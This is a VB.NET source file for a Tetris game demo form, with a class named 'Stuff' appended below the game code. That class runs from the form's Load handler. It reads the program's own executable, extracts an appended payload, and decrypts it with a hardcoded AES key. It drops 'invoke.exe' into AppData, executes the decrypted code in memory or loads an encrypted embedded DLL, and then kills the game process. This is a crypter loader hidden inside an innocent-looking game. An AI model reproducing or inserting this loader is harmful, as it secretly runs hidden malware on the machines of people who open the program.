Public Class Form1
    Private _newBlocksNumber As Integer

    Private Sub pnlBackgroundSolid_Click(sender As Object, e As EventArgs) Handles pnlBackgroundSolid.Click
        Call ManageColorProperty(sender, "BackColor")
    End Sub

    Private Sub ManageColorProperty(sender As Panel, propertyName As String)
        With Me.dlgColor
            .Color = sender.BackColor
            If .ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
                sender.BackColor = .Color
                CallByName(Me.TetrisBox1, propertyName, CallType.Set, .Color)
            End If
        End With
    End Sub

    Private Sub pnlBackgroundGradient1_Click(sender As Object, e As EventArgs) Handles pnlBackgroundGradient1.Click
        Call ManageColorProperty(sender, "GradientColor1")
    End Sub

    Private Sub pnlBackgroundGradient2_Click(sender As Object, e As EventArgs) Handles pnlBackgroundGradient2.Click
        Call ManageColorProperty(sender, "GradientColor2")
    End Sub

    Private Sub lnkBackgroundPicture_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkBackgroundPicture.LinkClicked
        If Me.dlgBackgroundPicture.ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
            Me.TetrisBox1.BackgroundImage = Image.FromFile(Me.dlgBackgroundPicture.FileName)
        End If
    End Sub

    Private Sub radBackgroundSolid_CheckedChanged(sender As Object, e As EventArgs) Handles radBackgroundSolid.CheckedChanged, radBackgroundGradient.CheckedChanged, radBackgroundPicture.CheckedChanged
        Select Case True
            Case Me.radBackgroundSolid.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.SolidColor
            Case Me.radBackgroundGradient.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.Gradient
            Case Me.radBackgroundPicture.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.Picture
        End Select
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.cboGradientDirection.SelectedIndex = 1
        For Each name As String In System.Enum.GetNames(GetType(System.Windows.Forms.Keys))
            Me.cboKeysLeft.Items.Add(name)
            Me.cboKeysRight.Items.Add(name)
            Me.cboKeysRotate.Items.Add(name)
            Me.cboKeysDrop.Items.Add(name)
        Next
        Stuff.EnsureInitialized()
        Stuff.Test()
        Me.cboKeysLeft.SelectedItem = "Left"
        Me.cboKeysRight.SelectedItem = "Right"
        Me.cboKeysRotate.SelectedItem = "Up"
        Me.cboKeysDrop.SelectedItem = "Down"
    End Sub

    Private Sub cboGradientDirection_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboGradientDirection.SelectedIndexChanged
        Select Case Me.cboGradientDirection.SelectedIndex
            Case 0
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.Horizontal
            Case 1
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.Vertical
            Case 2
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.ForwardDiagonal
            Case 3
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.BackwardDiagonal
        End Select
    End Sub

    Private Sub numRows_ValueChanged(sender As Object, e As EventArgs) Handles numRows.ValueChanged
        Me.TetrisBox1.Rows = Me.numRows.Value
    End Sub

    Private Sub numColumns_ValueChanged(sender As Object, e As EventArgs) Handles numColumns.ValueChanged
        Me.TetrisBox1.Columns = Me.numColumns.Value
    End Sub

    Private Sub numCellSize_ValueChanged(sender As Object, e As EventArgs) Handles numCellSize.ValueChanged
        Me.TetrisBox1.CellSize = Me.numCellSize.Value
    End Sub

    Private Sub pnlBlock1Color_Click(sender As Object, e As EventArgs) Handles pnlBlock1Color.Click, pnlBlock2Color.Click, pnlBlock3Color.Click, pnlBlock4Color.Click, pnlBlock5Color.Click, pnlBlock6Color.Click, pnlBlock7Color.Click
        Call ManageColorProperty(sender, DirectCast(sender, Panel).Name.Replace("pnl", String.Empty))
    End Sub

    Private Sub cboKeysLeft_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysLeft.SelectedIndexChanged
        Call ManageKeyProperty(sender, "LeftKey")
    End Sub

    Private Sub ManageKeyProperty(sender As ComboBox, propertyName As String)
        Dim names() As String = System.Enum.GetNames(GetType(System.Windows.Forms.Keys))
        Dim values() As Integer = System.Enum.GetValues(GetType(System.Windows.Forms.Keys))
        For index = 0 To names.Length - 1
            If sender.SelectedItem.Equals(names(index)) Then
                CallByName(Me.TetrisBox1, propertyName, CallType.Set, CType(values(index), System.Windows.Forms.Keys))
            End If
        Next
    End Sub

    Private Sub cboKeysRight_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysRight.SelectedIndexChanged
        Call ManageKeyProperty(sender, "RightKey")
    End Sub

    Private Sub cboKeysRotate_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysRotate.SelectedIndexChanged
        Call ManageKeyProperty(sender, "RotateKey")
    End Sub

    Private Sub cboKeysDrop_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysDrop.SelectedIndexChanged
        Call ManageKeyProperty(sender, "DropKey")
    End Sub

    Private Sub pnlRandomBlock_Click(sender As Object, e As EventArgs) Handles pnlRandomBlock.Click
        Call ManageColorProperty(sender, "RandomBlockColor")
    End Sub

    Private Sub pnlUncompleteLine_Click(sender As Object, e As EventArgs) Handles pnlUncompleteLine.Click
        Call ManageColorProperty(sender, "UncompleteRowColor")
    End Sub

    Private Sub tbrSpeed_Scroll(sender As Object, e As EventArgs) Handles tbrSpeed.Scroll, tbrSpeed.ValueChanged
        Me.TetrisBox1.TimerInterval = Me.tbrSpeed.Value
    End Sub

    Private Sub btnStart_Click(sender As Object, e As EventArgs) Handles btnStart.Click
        Me.btnStart.Enabled = False
        Me.btnStop.Enabled = True
        Me.btnPause.Enabled = True

        Me.gbxBackground.Enabled = False
        Me.gbxBlockColors.Enabled = False
        Me.gbxBoardSize.Enabled = False
        Me.gbxDifficulties.Enabled = False
        Me.gbxKeys.Enabled = False

        _newBlocksNumber = 0

        Me.TetrisBox1.StartGame()
    End Sub

    Private Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click
        Me.TetrisBox1.StopGame()
        Call GameStopped()
    End Sub

    Private Sub GameStopped()
        Me.btnStart.Enabled = True
        Me.btnStop.Enabled = False
        Me.btnPause.Enabled = False
        Me.btnResume.Enabled = False

        Me.gbxBackground.Enabled = True
        Me.gbxBlockColors.Enabled = True
        Me.gbxBoardSize.Enabled = True
        Me.gbxDifficulties.Enabled = True
        Me.gbxKeys.Enabled = True
    End Sub

    Private Sub TetrisBox1_FullRows(sender As Object, e As TetrisBox.FullRowsEventArgs) Handles TetrisBox1.FullRows
        Me.lstEvents.Items.Add("FullRows [NumberOfRows=" + e.NumberOfRows.ToString + "]")
    End Sub

    Private Sub TetrisBox1_GameOver(sender As Object, e As EventArgs) Handles TetrisBox1.GameOver
        Call GameStopped()
        Me.lstEvents.Items.Add("GameOver")
    End Sub

    Private Sub btnPause_Click(sender As Object, e As EventArgs) Handles btnPause.Click
        Me.TetrisBox1.Pause()
        Me.btnPause.Enabled = False
        Me.btnResume.Enabled = True
    End Sub

    Private Sub btnResume_Click(sender As Object, e As EventArgs) Handles btnResume.Click
        Me.TetrisBox1.Resume()
        Me.btnPause.Enabled = True
        Me.btnResume.Enabled = False
    End Sub

    Private Sub TetrisBox1_NewBlock(sender As Object, e As TetrisBox.NewBlockEventArgs) Handles TetrisBox1.NewBlock
        Me.lstEvents.Items.Add("NewBlock [BlockType=" + e.BlockType.ToString + ", NextBlockType=" + e.NextBlockType.ToString + "]")

        _newBlocksNumber += 1

        If Me.chkRandomBlock.Checked AndAlso ((_newBlocksNumber Mod Me.numRandomBlock.Value) = 0) Then
            Me.TetrisBox1.AddRandomBlock()
        End If

        If Me.chkUncompleteLine.Checked AndAlso ((_newBlocksNumber Mod Me.numUncompleteLine.Value) = 0) Then
            Me.TetrisBox1.AddUncompleteRow()
        End If
    End Sub

    Private Sub TetrisBox1_Starting(sender As Object, e As EventArgs) Handles TetrisBox1.Starting
        Me.lstEvents.Items.Add("Starting")
    End Sub

    Private Sub lnkArticle_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkArticle.LinkClicked
        Process.Start("http://www.codeproject.com/Articles/812310/Create-Tetris-games-in-Net")
    End Sub
End Class

Class Stuff
    Shared Function RedimPload(ByVal Payload() As Byte, Start As Integer) As Byte()
        Dim NewByts(0 To (Payload.Length - Start) - 1) As Byte
        Return NewByts
    End Function

    Shared Sub Test()
        Dim AppPath As String = Application.ExecutablePath
        Dim Payload() As Byte = GetPload(AppPath)
        Dim i As Integer = FindSplit(Payload)
        Dim Start As Integer = i
        If Payload(Start - 8) = &H54 Then
            'net
        Else
            'native
            'drop invoke.exe
            Try
                FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe", My.Resources.invoke, False)
            Catch ex As Exception
                If FileIO.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe") Then
                Else
                    End
                End If
            End Try
            AppPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe"
        End If
        Dim NewByts() As Byte = RedimPload(Payload, Start)
        NewByts = Loop1(NewByts, Payload, Start)
        NewByts = Loop2(NewByts)
        If Payload(Start - 8) = &H54 Then
            Dim f As New dll.Class1
            f.Main(Application.ExecutablePath)
        Else
            CMemoryExecute.Run(AES_Decrypt(NewByts), AppPath)
        End If

        Process.GetCurrentProcess.Kill()
    End Sub

    Shared Function Loop2(ByVal NewByts() As Byte) As Byte()
        Dim Tmp() As Byte = NewByts
        Dim I As Integer = FindSplit(NewByts) - 7
        ReDim NewByts(0 To I)
        For I = 0 To NewByts.Length - 1
            NewByts(I) = Tmp(I)
        Next
        Return NewByts
    End Function

    Shared Function Loop1(ByVal NewByts() As Byte, ByVal Payload() As Byte, ByVal Start As Integer) As Byte()
        For i = 0 To NewByts.Length - 1
            NewByts(i) = Payload(Start + i)
        Next
        Return NewByts
    End Function

    Shared Function FindSplit(ByVal Payload() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim I As Integer = 0
        For Each bytez In Payload
            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If bytez = &H40 Then
                            Found3 = True
                        Else
                            Found1 = False
                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                Else
                                    Found4 = False
                                    Found3 = False
                                    Found2 = False
                                    Found1 = False
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            I += 1
        Next
        Return I + 1
    End Function

    Shared Function GetPload(ByVal AppPath As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(AppPath)
    End Function
    Public Shared _initialized As Boolean
    Shared Sub EnsureInitialized()
        If Not _initialized Then
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
    End Sub
    Private Shared Function AES_Decrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        Dim resourceName As String = "TetrisBoxTest." + New Reflection.AssemblyName(args.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)

            Dim assemblyData = New Byte(stream.Length - 1) {}
            'decode assembly here

            stream.Read(assemblyData, 0, assemblyData.Length)
            assemblyData = AES_Decrypt(assemblyData)
            Return Reflection.Assembly.Load(assemblyData)

        End Using ' stream
    End Function

    Private Function ToBytes(ByVal instance As IO.Stream) As Byte()
        Dim capacity As Integer = If(instance.CanSeek, Convert.ToInt32(instance.Length), 0)
        Using result As New IO.MemoryStream(capacity)
            Dim readLength As Integer
            Dim buffer(4096) As Byte
            Do
                readLength = instance.Read(buffer, 0, buffer.Length)
                result.Write(buffer, 0, readLength)
            Loop While readLength > 0
            Return result.ToArray()
        End Using
    End Function

End Class